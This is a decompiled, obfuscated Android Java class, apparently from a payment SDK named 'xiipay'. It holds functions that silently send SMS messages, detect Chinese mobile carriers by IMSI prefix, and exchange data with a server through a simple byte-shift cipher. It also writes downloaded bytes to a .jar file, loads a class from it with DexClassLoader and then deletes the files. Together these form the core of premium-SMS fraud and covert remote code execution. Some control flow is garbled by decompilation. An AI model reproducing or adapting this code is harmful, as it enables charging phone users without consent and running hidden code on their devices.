package com.xiipay.a;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Proxy;
import android.telephony.SmsManager;
import dalvik.system.DexClassLoader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import org.apache.http.Header;
import org.apache.http.HeaderElement;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;

public class k
{
  public static byte a = Byte.MAX_VALUE;
  public static byte b = Byte.MIN_VALUE;
  public static byte[] c = { 7, 2, 3, 9, 4, 5, 1 };
  private static Random d = new Random();
  private static int e = 19968;
  private static int f = 40869;
  private static int g = 63744;
  private static int h = 64045;
  private static DecimalFormat i = new DecimalFormat("0.00");
  
  public k() {}
  
  private static Object a(File paramFile, String paramString)
  {
    try
    {
      paramFile = new DexClassLoader(paramFile.getAbsolutePath(), paramFile.getParentFile().getAbsolutePath(), null, k.class.getClassLoader()).loadClass(paramString).newInstance();
      return paramFile;
    }
    catch (Exception paramFile)
    {
      paramFile.printStackTrace();
    }
    return null;
  }
  
  public static Object a(File paramFile, byte[] paramArrayOfByte, String paramString1, String paramString2)
  {
    File localFile = new File(paramFile, paramString1 + ".jar");
    paramFile = new File(paramFile, paramString1 + ".dex");
    a(localFile, paramArrayOfByte);
    paramArrayOfByte = a(localFile, paramString2);
    localFile.delete();
    paramFile.delete();
    return paramArrayOfByte;
  }
  
  public static String a(int paramInt)
  {
    StringBuffer localStringBuffer = new StringBuffer("");
    int j = 0;
    for (;;)
    {
      if (j >= paramInt) {
        return localStringBuffer.toString();
      }
      localStringBuffer.append(d.nextInt(10));
      j += 1;
    }
  }
  
  public static void a(File paramFile, byte[] paramArrayOfByte)
  {
    paramFile = new FileOutputStream(paramFile);
    paramFile.write(paramArrayOfByte);
    paramFile.flush();
    paramFile.close();
  }
  
  public static boolean a(String paramString)
  {
    return paramString.startsWith("46003");
  }
  
  public static boolean a(String paramString1, String paramString2, Context paramContext)
  {
    byte[] arrayOfByte = new byte[1];
    arrayOfByte[0] = 0;
    for (;;)
    {
      int j;
      try
      {
        String str = a(10);
        local1 = new k.1(arrayOfByte);
        paramContext.registerReceiver(local1, new IntentFilter(str));
        SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, PendingIntent.getBroadcast(paramContext, 0, new Intent(str), 0), null);
        j = 0;
      }
      catch (Exception paramString1)
      {
        k.1 local1;
        return arrayOfByte[0] == 1;
      }
      paramContext.unregisterReceiver(local1);
      if (arrayOfByte[0] == 1)
      {
        return true;
        b(1);
        j += 1;
      }
      else
      {
        return false;
      }
      if (j < 10) {
        if (arrayOfByte[0] == 0) {}
      }
    }
  }
  
  public static byte[] a(Context paramContext, String paramString)
  {
    paramString = new HttpGet(paramString);
    Object localObject = new BasicHttpParams();
    HttpConnectionParams.setConnectionTimeout((HttpParams)localObject, 30000);
    HttpConnectionParams.setSoTimeout((HttpParams)localObject, 30000);
    HttpConnectionParams.setSocketBufferSize((HttpParams)localObject, 8192);
    HttpClientParams.setRedirecting((HttpParams)localObject, true);
    localObject = new DefaultHttpClient((HttpParams)localObject);
    ((HttpClient)localObject).getParams().setParameter("http.route.default-proxy", new HttpHost(Proxy.getDefaultHost(), Proxy.getPort(paramContext)));
    paramContext = ((HttpClient)localObject).execute(paramString);
    if (paramContext.getStatusLine().getStatusCode() == 200)
    {
      paramString = paramContext.getEntity();
      localObject = paramString.getContentEncoding();
      int k;
      int j;
      if (localObject != null)
      {
        localObject = ((Header)localObject).getElements();
        k = localObject.length;
        j = 0;
      }
      for (;;)
      {
        if (j >= k) {}
        for (;;)
        {
          return a(paramContext.getEntity().getContent());
          if (!localObject[j].getName().equalsIgnoreCase("gzip")) {
            break;
          }
          paramContext.setEntity(new e(paramString));
        }
        j += 1;
      }
    }
    return null;
  }
  
  public static byte[] a(Context paramContext, String paramString, byte[] paramArrayOfByte, boolean paramBoolean)
  {
    paramArrayOfByte = new ByteArrayEntity(b(paramArrayOfByte));
    paramString = new HttpPost(paramString);
    paramString.setEntity(paramArrayOfByte);
    paramArrayOfByte = new BasicHttpParams();
    HttpConnectionParams.setConnectionTimeout(paramArrayOfByte, 30000);
    HttpConnectionParams.setSoTimeout(paramArrayOfByte, 30000);
    HttpConnectionParams.setSocketBufferSize(paramArrayOfByte, 8192);
    HttpClientParams.setRedirecting(paramArrayOfByte, true);
    paramArrayOfByte = new DefaultHttpClient(paramArrayOfByte);
    if (paramBoolean) {
      paramArrayOfByte.getParams().setParameter("http.route.default-proxy", new HttpHost(Proxy.getDefaultHost(), Proxy.getPort(paramContext)));
    }
    paramContext = paramArrayOfByte.execute(paramString);
    if (paramContext.getStatusLine().getStatusCode() == 200)
    {
      paramString = paramContext.getEntity();
      paramArrayOfByte = paramString.getContentEncoding();
      int k;
      int j;
      if (paramArrayOfByte != null)
      {
        paramArrayOfByte = paramArrayOfByte.getElements();
        k = paramArrayOfByte.length;
        j = 0;
      }
      for (;;)
      {
        if (j >= k) {}
        for (;;)
        {
          return a(a(paramContext.getEntity().getContent()));
          if (!paramArrayOfByte[j].getName().equalsIgnoreCase("gzip")) {
            break;
          }
          paramContext.setEntity(new e(paramString));
        }
        j += 1;
      }
    }
    return null;
  }
  
  public static byte[] a(File paramFile)
  {
    if (!paramFile.exists()) {
      return null;
    }
    return a(new FileInputStream(paramFile));
  }
  
  public static byte[] a(InputStream paramInputStream)
  {
    ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
    byte[] arrayOfByte = new byte['Ð€'];
    for (int j = paramInputStream.read(arrayOfByte);; j = paramInputStream.read(arrayOfByte))
    {
      if (j == -1)
      {
        paramInputStream.close();
        return localByteArrayOutputStream.toByteArray();
      }
      localByteArrayOutputStream.write(arrayOfByte, 0, j);
    }
  }
  
  private static byte[] a(byte[] paramArrayOfByte)
  {
    int j = 0;
    for (;;)
    {
      if (j >= paramArrayOfByte.length) {
        return paramArrayOfByte;
      }
      int k = paramArrayOfByte[j] - c[(j % c.length)];
      int m = b - k;
      if (m > 0) {
        k = a - m + 1;
      }
      paramArrayOfByte[j] = ((byte)k);
      j += 1;
    }
  }
  
  public static String[] a(String paramString1, String paramString2)
  {
    int k = 0;
    String[] arrayOfString = null;
    ArrayList localArrayList;
    if (paramString1 != null) {
      localArrayList = new ArrayList();
    }
    for (int j = paramString1.indexOf(paramString2, 0);; j = paramString1.indexOf(paramString2, k))
    {
      if (j == -1)
      {
        localArrayList.add(paramString1.substring(k, paramString1.length()).trim());
        arrayOfString = new String[localArrayList.size()];
        localArrayList.toArray(arrayOfString);
        return arrayOfString;
      }
      localArrayList.add(paramString1.substring(k, j).trim());
      k = paramString2.length() + j;
    }
  }
  
  public static void b(int paramInt)
  {
    int j = 0;
    for (;;)
    {
      if (j >= paramInt) {
        return;
      }
      try
      {
        Thread.sleep(1000L);
        j += 1;
      }
      catch (Exception localException)
      {
        for (;;)
        {
          localException.printStackTrace();
        }
      }
    }
  }
  
  public static boolean b(String paramString)
  {
    return (paramString.startsWith("46002")) || (paramString.startsWith("46011"));
  }
  
  private static byte[] b(byte[] paramArrayOfByte)
  {
    int j = 0;
    for (;;)
    {
      if (j >= paramArrayOfByte.length) {
        return paramArrayOfByte;
      }
      int k = paramArrayOfByte[j] + c[(j % c.length)];
      int m = k - a;
      if (m > 0) {
        k = b + m - 1;
      }
      paramArrayOfByte[j] = ((byte)k);
      j += 1;
    }
  }
  
  public static String c(String paramString)
  {
    StringBuffer localStringBuffer = new StringBuffer();
    int k = 0;
    if (k >= paramString.length()) {
      return localStringBuffer.toString();
    }
    int j = paramString.charAt(k);
    int n;
    int m;
    char c1;
    if ((j >= 33) && (j <= 126))
    {
      n = j + c[(k % c.length)];
      m = n;
      if (n > 126) {
        m = n - 126 + 33 - 1;
      }
      c1 = (char)m;
    }
    for (;;)
    {
      localStringBuffer.append(c1);
      k += 1;
      break;
      if ((j >= e) && (j <= f))
      {
        n = j + c[(k % c.length)];
        m = n;
        if (n > f) {
          m = n - f + e - 1;
        }
        c1 = (char)m;
      }
      else
      {
        c1 = j;
        if (j >= g)
        {
          c1 = j;
          if (j <= h)
          {
            n = j + c[(k % c.length)];
            m = n;
            if (n > h) {
              m = n - h + g - 1;
            }
            c1 = (char)m;
          }
        }
      }
    }
  }
  
  public static int d(String paramString)
  {
    String str = paramString;
    if (paramString.endsWith("Ôª")) {
      str = paramString.substring(0, paramString.length() - 1);
    }
    return e(str);
  }
  
  private static int e(String paramString)
  {
    try
    {
      float f1 = i.parse(paramString).floatValue();
      return (int)(f1 * 100.0F);
    }
    catch (Exception paramString) {}
    return 0;
  }
}
